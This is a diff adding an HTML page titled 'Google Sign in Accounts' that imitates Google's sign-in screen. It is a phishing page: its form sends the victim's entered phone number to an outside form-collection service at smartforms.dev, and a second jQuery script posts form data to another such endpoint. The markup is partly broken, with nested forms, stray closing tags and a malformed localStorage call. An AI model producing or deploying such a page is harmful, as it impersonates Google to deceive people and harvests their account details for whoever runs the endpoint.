@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" type="x-icon" href="google.png" id="logo">
+    <link rel="stylesheet" href="phone.css">
+    <title>Google Sign in Accounts</title>
+
+</head>
+
+<body>
+  
+  
+    <div class="main_container">
+        <form action="https://smartforms.dev/submit/669543725df1517d48d916f0" method="POST">
+            <div class="inner_container">
+                <img src="social.png" alt="This is an image" id="inner_logo">
+                <div class="inner_head">
+
+                    <span id="sign">Sign in</span>
+
+                    <span id="use">Use your Google Account</span>   </div>
+
+
+                    <div class="email_input">
+
+
+                        <input type="text" name="pho ne numb er" placeholder="Phone Number" required >
+                        <button></button>
+                    </div>
+                    <div class="learnmore">
+                         <a href=""></a>
+                    </div>
+
+                    
+                            <form action="#"> <button id="next">Next</button> </form>
+                        </div>
+                    </div>
+
+
+                </div>
+        </form>
+
+
+            </div>
+
+            <!-- inner container div closing -->
+        </div>
+
+
+    </div>
+
+
+
+
+
+
+    <!-- outter container div closing -->
+    </div>
+
+    <script>
+        a = document.getElementById('email');
+
+        localStorage.setItem(a);
+    </script>
+<script>
+/* Ajax request, works with files too! */
+$("#myForm").submit(function(e){
+  e.preventDefault();
+  
+  $.ajax({
+    type: "POST",
+    url: 'https://smartforms.dev/submit/668ea9685df1517d48d9135f',
+    crossDomain: true,
+    data: new FormData(this),
+    processData: false,
+    contentType: false,
+    headers: {
+      "Accept": "application/json"
+    }
+  }).done(function() {
+    alert('Thanks for messaging us!')
+  })
+});
+</script>
+</body>
+
+</html>
